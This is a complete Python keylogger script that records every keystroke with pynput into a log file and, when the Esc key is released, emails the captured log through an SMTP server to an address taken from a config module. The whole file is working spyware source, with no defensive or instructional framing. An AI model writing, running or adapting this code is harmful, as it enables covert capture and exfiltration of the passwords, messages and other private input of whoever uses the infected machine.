import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import config
import datetime

# Function to log keystrokes
def on_press(key):
    try:
        with open(config.LOG_FILE_PATH, 'a') as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(config.LOG_FILE_PATH, 'a') as log_file:
            log_file.write(f"{key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener and send the log file
        send_log_via_email()
        return False

# Function to send the log file via email
def send_log_via_email():
    with open(config.LOG_FILE_PATH, 'r') as file:
        log_content = file.read()
    
    now = datetime.datetime.now()
    time_stamp = now.strftime("%d/%m/%Y, %H:%M:%S")

    msg = MIMEMultipart()
    msg['From'] = config.SENDER_EMAIL
    msg['To'] = config.RECEIVER_EMAIL
    msg['Subject'] = f"Keylogger Log File - {time_stamp}"

    body = MIMEText(log_content, 'plain')
    msg.attach(body)

    try:
        server = smtplib.SMTP(config.SMTP_SERVER, config.SMTP_PORT)
        server.starttls()
        server.login(config.SENDER_EMAIL, config.EMAIL_PASSWORD)
        server.send_message(msg)
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

# Set up the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
